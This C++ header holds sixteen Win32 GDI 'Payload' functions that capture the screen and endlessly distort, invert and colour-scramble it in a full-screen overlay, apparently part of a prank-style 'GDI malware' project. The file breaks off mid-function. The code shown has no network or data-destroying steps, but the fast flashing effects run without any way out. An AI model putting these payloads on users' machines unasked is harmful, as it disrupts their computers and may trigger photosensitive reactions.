#pragma once
#include <iostream>
#include <windows.h>
#include <windowsx.h>
#include <cmath>
#include <stdio.h>
#include <tchar.h>
#include <ShlObj.h>
#include <time.h>
#include "GDIConfig.h"
#include "BonusFunctions.h"
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "msimg32.lib")
#define RGBBRUSH (DWORD)0x1900ac010e

DWORD WINAPI Payload1(LPVOID lpParam) {
    BLENDFUNCTION blur = { AC_SRC_OVER, 0, 100, 0 };
    int size = 200, xxx = 0;
    srand(time(NULL));
    while (true) {
        HDC hdc = GetDC(0), hdc2 = GetDC(GDIWindow_hwnd), hcdc = CreateCompatibleDC(hdc);
        BITMAPINFO bmi = { 0 }; PRGBQUAD rgbScreen = { 0 };
        bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32 };
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < w * h; i++) {
            rgbScreen[i].rgb ^= i + xxx & (i % w + i / h) | i & (w + h) + xxx;
        }
        for (int i = 0; i < 5; i++) {
            int x = -size + rand() % (w + size), y = -size + rand() % (h + size);
            HBRUSH hBrush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
            SelectObject(hcdc, hBrush);
            BitBlt(hcdc, x, y, size, size, hcdc, x + rand() % 20 - 9, y + rand() % 20 - 9, PATINVERT);
            DeleteObject(hBrush);
        }
        for (int i = 0; i < 5; i++) {
            int y = (h / 2) - rand() % h;
            HBRUSH hBrush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
            SelectObject(hcdc, hBrush);
            BitBlt(hcdc, 0, y, w, h, hcdc, 0, y, PATINVERT);
            DeleteObject(hBrush);
        }
        for (int y = 0; y < h; y += 5) {
            StretchBlt(hcdc, -20 + rand() % 41, y, w, 5, hcdc, 0, y, w, 5, SRCAND);
        }
        BitBlt(hcdc, rand() % 10, rand() % 10, w, h, hcdc, rand() % 10, rand() % 10, SRCCOPY);
        BitBlt(hdc2, 0, 0, w, h, hcdc, 0, 0, NOTSRCCOPY);
        for (int i = 0; i < 2; i++) {
            AlphaBlend(hdc2, -20 + rand() % 41, -20 + rand() % 41, w, h, hcdc, 0, 0, w, h, blur);
        }
        ReleaseDC(0, hdc); ReleaseDC(0, hdc2); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc); DeleteDC(hdc2);
        Sleep(1);
    }
}

DWORD WINAPI Payload2(LPVOID lpParam) {
    BLENDFUNCTION blur = { AC_SRC_OVER, 0, 80, 0 };
    RGBQUAD rgbquadCopy; HBRUSH hBrush = NULL; int i = 0, rop = 0;
    srand(time(NULL));
    while (true) {
        HDC hdc = GetDC(0), hdc2 = GetDC(GDIWindow_hwnd), hcdc = CreateCompatibleDC(hdc);
        BITMAPINFO bmpi = { 0 }; bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32 };
        RGBQUAD* rgbquad = NULL; HSL hslcolor;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = x * h + y, fx = (int)((i / (1 + x)) ^ (i % (1 + y)) * ((1 + i) / 2));
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 200.f + y / h * .2f, 1.f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        for (int y = 0; y < h; y += 50) {
            int rnd2 = 5 - (rand() % 11); hBrush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
            SelectObject(hcdc, hBrush);
            StretchBlt(hcdc, -rnd2, y, w + rnd2, 50, hcdc, rnd2, y, w, 50, RGBBRUSH);
            DeleteObject(hBrush);
        }
        for (int y = 0; y < h; y += 25) {
            rop = SRCCOPY; int rnd = rand() % 31;
            if (rnd >= 10 && rnd < 20) { rop = SRCAND; }
            else if (rnd >= 20 && rnd < 30) { rop = SRCPAINT; }
            int rnd1 = 10 - (rand() % 21);
            StretchBlt(hcdc, -rnd1, y, w + rnd1, 25, hcdc, rnd1, y, w, 25, rop);
        }
        for (int x = 0; x < w; x += 25) {
            int rnd = 5 - (rand() % 11);
            StretchBlt(hcdc, x, -rnd, 25, h + rnd, hcdc, x, rnd, 25, h, SRCCOPY);
        }
        BitBlt(hcdc, rand() % 10, rand() % 10, w, h, hcdc, rand() % 10, rand() % 10, SRCCOPY);
        BitBlt(hdc2, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        for (int i = 0; i < 2; i++) {
            AlphaBlend(hdc2, -5 + rand() % 11, -5 + rand() % 11, w, h, hcdc, 0, 0, w, h, blur);
        }
        ReleaseDC(0, hdc); ReleaseDC(0, hdc2); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc); DeleteDC(hdc2);
        Sleep(1); i++;
    }
}

DWORD WINAPI Payload3(LPVOID lpParam) {
    int xxx = 0, blocksize = 50;
    srand(time(NULL));
    while (true) {
        int can1 = 1;
        int jia1 = 0, jia2 = 0, x = 0; int y = 0;
        int x1 = 0, y1 = 0, x2 = 0, y2 = 0;
        bool bianliang1 = true;
        while (bianliang1) {
            jia1 = jia1 + blocksize;
            if (jia1 > w) { bianliang1 = false; }
            else { can1 = can1 + 1; }
        }
        can1 = can1 + 1; bianliang1 = true;
        int can2 = 1;
        while (bianliang1) {
            jia2 = jia2 + blocksize;
            if (jia2 > h) { bianliang1 = false; }
            else { can2 = can2 + 1; }
        }
        can2 = can2 + 1;
        HDC hdc = GetDC(0), hdc2 = GetDC(GDIWindow_hwnd), hcdc = CreateCompatibleDC(hdc);
        BITMAPINFO bmi = { 0 };
        PRGBQUAD rgbScreen = { 0 };
        bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32 };
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int jin = 0; jin < can2 + 1; jin++) {
            for (int gui = 0; gui < can1 + 1; gui++) {
                x = rand() % can1, y = jin;
                if (x == 1) { x1 = 0; }
                else if (x == 2) { x1 = blocksize; }
                else { x1 = blocksize * x - blocksize; }

                if (y == 1) { y1 = 0; }
                else if (y == 2) { y1 = blocksize; }
                else { y1 = blocksize * y - blocksize; }

                x = rand() % can1, y = rand() % can2;
                if (x == 1) { x2 = 0; }
                else if (x == 2) { x2 = blocksize; }
                else { x2 = blocksize * x - 1; }

                if (y == 1) { y2 = 0; }
                else if (y == 2) { y2 = blocksize; }
                else { y2 = blocksize * y - 1; }

                StretchBlt(hcdc, x1, y1, blocksize, blocksize, hcdc, x2, y2, blocksize, blocksize, SRCCOPY);
            }
        }
        for (int x = 0; x < w; x += 20) {
            StretchBlt(hcdc, x, -10 + rand() % 20, 20, h, hcdc, x, 0, 20, h, SRCAND);
        }
        for (int y = 0; y < h; y += 20) {
            StretchBlt(hcdc, -10 + rand() % 20, y, w, 20, hcdc, 0, y, w, 20, SRCPAINT);
        }
        for (int i = 0; i < w * h; i++) {
            rgbScreen[i].rgb >>= xxx + ((i & h) + w) & ((i * 4) + (i / h));
        }
        BitBlt(hcdc, rand() % 10, rand() % 10, w, h, hcdc, rand() % 10, rand() % 10, SRCCOPY);
        BitBlt(hcdc, -10 + rand() % 21, -10 + rand() % 21, w, h, hcdc, -10 + rand() % 21, -10 + rand() % 21, SRCAND);
        BitBlt(hdc2, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hdc2); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc); DeleteDC(hdc2);
        blocksize += 1; if (blocksize >= 200) { blocksize = 80; }
        Sleep(1); xxx++;
    }
}

DWORD WINAPI Payload4(LPVOID lpParam) {
    int i = 0, xxx = 0;
    while (true) {
        BITMAPINFO bmi = { 40, w, h, 1, 24 }; PRGBQUAD prgbScreen = { 0 };
        bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32 };
        HDC hdc = GetDC(0), hdc2 = GetDC(GDIWindow_hwnd), hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, 0, (void**)&prgbScreen, 0, 0);
        SelectObject(hcdc, hBitmap);
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                prgbScreen[index].r = sin((x + i) * (3.1415926 / (w / 50))) * 128 + 128;
                prgbScreen[index].g = cos(((x ^ y) + xxx) * ((w + h) / 4)) * 32;
                prgbScreen[index].b = sin((y + i) * (3.1415926 / (w / 50))) * 128 + 128;
            }
        }
        for (int y = 0; y < h; y += 20) {
            StretchBlt(hcdc, -1 + rand() % 3, y, w, 20, hcdc, 0, y, w, 20, SRCAND);
        }
        BitBlt(hdc2, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hdc2); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc); DeleteDC(hdc2);
        Sleep(1); i += 5, xxx += 20;
    }
}

DWORD WINAPI Payload5(LPVOID lpParam) {
    int i = 0, xxx = 0;
    while (true) {
        int rnd = 1 + rand() % (h / 2);
        LPVOID MyMemoryAddress = VirtualAlloc(0, (w * h + w) * sizeof(_RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); _RGBQUAD* data = (_RGBQUAD*)MyMemoryAddress;
        HDC hdc = GetDC(0), hdc2 = GetDC(GDIWindow_hwnd), hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int x = 0; x < w; x += rnd) {
            StretchBlt(hcdc, x, -10 + rand() % 21, rnd, h, hcdc, x, 0, rnd, h, SRCAND);
        }
        for (int y = 0; y < h; y += rnd) {
            StretchBlt(hcdc, -10 + rand() % 21, y, w, rnd, hcdc, 0, y, w, rnd, SRCAND);
        }
        for (int y = 0; y < h; y++) {
            int wow = (double)y / 10.0 * (double)xxx, x = (int)(tan(wow) * 20.0);
            BitBlt(hcdc, x, y, w, 1, hcdc, 0, y, SRCCOPY);
        }
        GetBitmapBits(hBitmap, w * h * 4, data);
        int v = rand() % 120; BYTE byte = rand() % 0xff;
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / w;
            ((BYTE*)(data + i + v))[v % 5] *= xxx * (i * ((x ^ y) + (x | y)));
        }
        SetBitmapBits(hBitmap, w * h * 4, data);
        BitBlt(hdc2, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hdc2); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc); DeleteDC(hdc2);
        VirtualFree(MyMemoryAddress, 0, MEM_RELEASE);
        Sleep(1); i++; xxx += 2;
    }
}

DWORD WINAPI Payload6(LPVOID lpParam) {
    int i = 0;
    while (true) {
        int rnd = 1 + rand() % (h / 2);
        LPVOID MyMemoryAddress = VirtualAlloc(0, (w * h + w) * sizeof(_RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); _RGBQUAD* data = (_RGBQUAD*)MyMemoryAddress;
        HDC hdc = GetDC(0), hdc2 = GetDC(GDIWindow_hwnd), hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        GetBitmapBits(hBitmap, w * h * 4, data);
        int v = rand() % 120; BYTE byte = rand() % 0xff;
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / w;
            int rgb = 4 * (int)data + ((x ^ y | x * y));
            ((BYTE*)(data + i))[v] ^= rgb;
        }
        SetBitmapBits(hBitmap, w * h * 4, data);
        for (int bl = 0; bl < h; bl += rnd) {
            StretchBlt(hcdc, -5 + rand() % 11, bl, w, rnd, hcdc, 0, bl, w, rnd, SRCAND);
        }
        BitBlt(hcdc, rand() % 10, rand() % 10, w, h, hcdc, rand() % 10, rand() % 10, SRCCOPY);
        BitBlt(hdc2, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hdc2); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc); DeleteDC(hdc2);
        VirtualFree(MyMemoryAddress, 0, MEM_RELEASE);
        Sleep(1); i++;
    }
}

DWORD WINAPI Payload7(LPVOID lpParam) { //credits to Executioner, but i modified it.
    int i = 0; double angle = 0.f;
    while (true) {
        int rnd = 1 + rand() % (h / 2);
        HDC hdc = GetDC(0), hdc2 = GetDC(GDIWindow_hwnd), hcdc = CreateCompatibleDC(hdc);
        BITMAPINFO bmpi = { 0 };
        bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        RGBQUAD* rgbquad = NULL; HSL hslcolor;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int bl = 0; bl < h; bl += rnd) {
            StretchBlt(hcdc, -5 + rand() % 11, bl, w, rnd, hcdc, 0, bl, w, rnd, SRCAND);
        }
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                int cx = x - (w / 2), cy = y - (h / 2);
                int zx = cos(angle) * cx - sin(angle) * cy, zy = sin(angle) * cx + cos(angle) * cy;
                int fx = (zx + i) & (zy + i);
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = (FLOAT)fmod((DOUBLE)hslcolor.h + (DOUBLE)(fx) / 2000, 1.0);
                hslcolor.s = 1.f;
                if (hslcolor.l < .4f) { hslcolor.l += .4f; }
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        BitBlt(hdc2, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hdc2); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc); DeleteDC(hdc2);
        Sleep(1); i++; angle += 0.02f;
    }
}

DWORD WINAPI Payload8(LPVOID lpParam) {
    int i = 0;
    while (true) {
        HDC hdc = GetDC(0), hdc2 = GetDC(GDIWindow_hwnd), hcdc = CreateCompatibleDC(hdc);
        BITMAPINFO bmpi = { 0 };
        bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        RGBQUAD* rgbquad = NULL; HSL hslcolor;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                int fx = (x + i) & y;
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 500.f, 1.f);
                hslcolor.s = 1.f;
                hslcolor.l += 1.f;
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        for (int y = 0; y < h; y += 20) {
            StretchBlt(hcdc, -5 + rand() % 11, y, w, 20, hcdc, 0, y, w, 20, SRCAND);
        }
        BitBlt(hdc2, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hdc2); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc); DeleteDC(hdc2);
        Sleep(1); i += 10;
    }
}

DWORD WINAPI Payload9(LPVOID lpParam) {
    int i = 0;
    srand(time(NULL));
    while (true) {
        HDC hdc = GetDC(0), hdc2 = GetDC(GDIWindow_hwnd), hcdc = CreateCompatibleDC(hdc);
        BITMAPINFO bmpi = { 0 };
        bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        RGBQUAD* rgbquad = NULL; HSL hslcolor;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
        BitBlt(hcdc, rand() % 10, rand() % 10, w, h, hcdc, rand() % 10, rand() % 10, SRCCOPY);
        for (int y = 0; y < h; y += 20) {
            StretchBlt(hcdc, -5 + rand() % 11, y, w, 20, hcdc, 0, y, w, 20, SRCCOPY);
        }
        BitBlt(hcdc, rand() % 10, rand() % 10, w, h, hcdc, rand() % 10, rand() % 10, SRCAND);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                FLOAT fx = (y + (i * 10));
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 200.f + y / h * .2f, 1.f);
                hslcolor.s += 1.f;
                hslcolor.l += 1.f;
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        BitBlt(hdc2, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hdc2); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc); DeleteDC(hdc2);
        Sleep(1); i++;
    }
}

DWORD WINAPI Payload10(LPVOID lpParam) {
    double angle = 0; int size = 250;
    srand(time(NULL));
    while (true) {
        HDC hdc = GetDC(0), hdc2 = GetDC(GDIWindow_hwnd), hcdc = CreateCompatibleDC(hdc); int rndrgb = 1 + RandomRGB();
        BITMAPINFO bmi = { 0 }; PRGBQUAD rgbScreen = { 0 };
        bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y += 20) {
            StretchBlt(hcdc, -5 + rand() % 11, y, w, 20, hcdc, 0, y, w, 20, SRCAND);
        }
        for (float i = 0; i < w; i += 0.99f) {
            int a = cos(angle) * 4;
            BitBlt(hcdc, i, 0, 1, h, hcdc, i, a, SRCCOPY);
            angle += 3.1415926 / 100;
        }
        for (float i = 0; i < h; i += 0.99f) {
            int a = cos(angle) * 4;
            BitBlt(hcdc, 0, i, w, 1, hcdc, a, i, SRCCOPY);
            angle += 3.1415926 / 100;
        }
        for (int i = 0; i < w * h; i++) {
            rgbScreen[i].rgb *= (rgbScreen[i].rgb * 2) % rndrgb;
        }
        for (int i = 0; i < 30; i++) {
            int x = -size + rand() % (w + size), y = -size + rand() % (h + size);
            BitBlt(hcdc, x, y, size, size, hcdc, x + rand() % 20 - 9, y + rand() % 20 - 9, SRCERASE);
        }
        BitBlt(hdc2, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hdc2); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc); DeleteDC(hdc2);
        Sleep(1);
    }
}

DWORD WINAPI Payload11(LPVOID lpParam) {
    int count = 0, xxx = 0, yyy = 0; double abc = 0.5;
    while (true) {
        HDC hdc = GetDC(0), hdc2 = GetDC(GDIWindow_hwnd), hcdc = CreateCompatibleDC(hdc);
        BITMAPINFO bmi = { 0 };
        bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        RGBQUAD* pBits = nullptr;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&pBits, NULL, 0);
        SelectObject(hcdc, hBitmap);
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = x + y * w;
                double wave = sin((x + xxx) * 0.02) + cos((y + yyy) * 0.02);
                pBits[index].rgbRed = (128 * sin(wave) * abc);
                pBits[index].rgbGreen = (128 * sin(wave) * abc);
                pBits[index].rgbBlue = (128 * sin(wave) * abc);
            }
        }
        BitBlt(hdc2, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hdc2); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc); DeleteDC(hdc2);
        if (count == 3) { count = 0; abc += 0.1; }
        else { count++; }
        Sleep(1); xxx++; yyy += 4;
    }
}

DWORD WINAPI Payload12(LPVOID lpParam) {
    PRGBTRIPLE rgbtriple; int a = 0;
    while (true) {
        HDC hdc = GetDC(0), hdc2 = GetDC(GDIWindow_hwnd), hcdc = CreateCompatibleDC(hdc);
        BITMAPINFO bmi = { 40, w, h, 1, 24 };
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, 0, (void**)&rgbtriple, 0, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y += 20) {
            StretchBlt(hcdc, -10 + rand() % 21, y, w, 20, hcdc, 0, y, w, 20, SRCAND);
        }
        for (int i = 0; i < w * h; i++) {
            rgbtriple[i].rgbtRed ^= GetRValue(i) * a;
            rgbtriple[i].rgbtGreen *= GetGValue(i) * a;
            rgbtriple[i].rgbtBlue ^= GetBValue(i) * a;
        }
        BitBlt(hcdc, rand() % 20, rand() % 20, w, h, hcdc, rand() % 20, rand() % 20, SRCCOPY);
        BitBlt(hdc2, 0, 0, w, h, hcdc, 0, 0, NOTSRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hdc2); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc); DeleteDC(hdc2);
        Sleep(1); if (a > 96) { a = 8; } else { a += 8; }
    }
}

DWORD WINAPI Payload13(LPVOID lpParam) {
    int i = 0, xxx = 0;
    while (true) {
        HDC hdc = GetDC(0), hdc2 = GetDC(GDIWindow_hwnd), hcdc = CreateCompatibleDC(hdc);
        BITMAPINFO bmpi = { 0 };
        bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        RGBQUAD* rgbquad = NULL;
        HSL hslcolor; RGBQUAD rgbquadCopy;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y += 20) {
            StretchBlt(hcdc, -20 + rand() % 41, y, w, 20, hcdc, 0, y, w, 20, SRCAND);
        }
        for (int y = 0; y < h; y += 50) {
            StretchBlt(hcdc, -20 + rand() % 41, y, w, 50, hcdc, 0, y, w, 50, SRCERASE);
        }
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x, fx = xxx + ((x + i) ^ (y + i));

                rgbquad[index].rgbRed += fx;
                rgbquad[index].rgbGreen += fx;
                rgbquad[index].rgbBlue += fx;
            }
        }
        BitBlt(hdc2, 0, 0, w, h, hcdc, 0, 0, NOTSRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hdc2); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc); DeleteDC(hdc2);
        Sleep(10); i++; xxx += 2;
    }
}

DWORD WINAPI Payload14(LPVOID lpParam) {
    int xxx = 0, yyy = 0; POINT point[3];
    while (true) {
        int increment = 10 + rand() % 40;
        HDC hdc = GetDC(0), hdc2 = GetDC(GDIWindow_hwnd), hcdc = CreateCompatibleDC(hdc);
        BITMAPINFO bmi = { 0 }; PRGBQUAD rgbScreen = { 0 };
        bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int x = 0; x < w; x += 50) {
            StretchBlt(hcdc, x, -10 + rand() % 21, 50, h, hcdc, x, 0, 50, h, SRCAND);
        }
        for (int y = 0; y < h; y += 50) {
            StretchBlt(hcdc, -20 + rand() % 41, y, w, 50, hcdc, 0, y, w, 50, SRCAND);
        }
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / w;
            rgbScreen[i].rgb ^= xxx + ((yyy + (x & y)) ^ (yyy + (x ^ y)));
        }
        if (rand() % 10 >= 6) {
            point[0].x = increment; point[0].y = -increment;
            point[1].x = w + increment; point[1].y = increment;
            point[2].x = -increment; point[2].y = h - increment;
        }
        else {
            point[0].x = -increment; point[0].y = increment;
            point[1].x = w - increment; point[1].y = -increment;
            point[2].x = increment; point[2].y = h + increment;
        }
        PlgBlt(hcdc, point, hcdc, 0, 0, w, h, 0, 0, 0);
        BitBlt(hdc2, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hdc2); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc); DeleteDC(hdc2);
        Sleep(1); xxx += 20; yyy += 2;
    }
}

DWORD WINAPI Payload15(LPVOID lpParam) {
    int i = 0;
    while (true) {
        HDC hdc = GetDC(0), hdc2 = GetDC(GDIWindow_hwnd), hcdc = CreateCompatibleDC(hdc);
        BITMAPINFO bmpi = { 0 };
        bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        RGBQUAD* rgbquad = NULL;
        HSL hslcolor; RGBQUAD rgbquadCopy;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            StretchBlt(hcdc, -4 + rand() % 9, y, w, 1, hcdc, 0, y, w, 1, SRCCOPY);
        }
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                rgbquad[index].rgbRed *= i + (x ^ y);
                rgbquad[index].rgbGreen *= i + (x ^ y);
                rgbquad[index].rgbBlue *= i + (x ^ y);
            }
        }
        BitBlt(hcdc, rand() % 5, rand() % 5, w, h, hcdc, rand() % 5, rand() % 5, SRCPAINT);
        MovingIcons(hcdc);
        for (int kun = 0; kun < 4; kun++) {
            int rand_num_x = rand() % w, rand_num_y = rand() % h;
            int top_x = 0 + rand_num_x, top_y = 0 + rand_num_y;
            int bottom_x = 180 + rand_num_x, bottom_y = 180 + rand_num_y;
            HRGN circle = CreateEllipticRgn(top_x, top_y, bottom_x, bottom_y);
            SelectClipRgn(hcdc, circle);
            HBRUSH hBrush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
            SelectObject(hcdc, hBrush);
            BitBlt(hcdc, rand_num_x, rand_num_y, w, h, hcdc, rand_num_x, rand_num_y, PATINVERT);
            DeleteObject(circle); DeleteObject(hBrush);
        }
        BitBlt(hdc2, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hdc2); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc); DeleteDC(hdc2);
        Sleep(10); i++;
    }
}

DWORD WINAPI Payload16(LPVOID lpParam) {
    int size = 450, xxx = 0, rop = NULL;
    while (true) {
        HDC hdc = GetDC(0), hdc2 = GetDC(GDIWindow_hwnd), hcdc = CreateCompatibleDC(hdc);
        BITMAPINFO bmi = { 0 }; PRGBQUAD rgbScreen = { 0 };
        bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
        for (int i = 0; i < w * h; i++) {
            int x = (i * i * 2) % w, y = (i & i * 2) ^ w;
            rgbScreen[i].rgb ^= ((xxx + x * y) | (xxx + i + w + h) * i);
        }
        BitBlt(hcdc, rand() % 5, rand() % 5, w, h, hcdc, rand() % 5, rand() % 5, SRCAND);
        MovingIcons(hcdc);
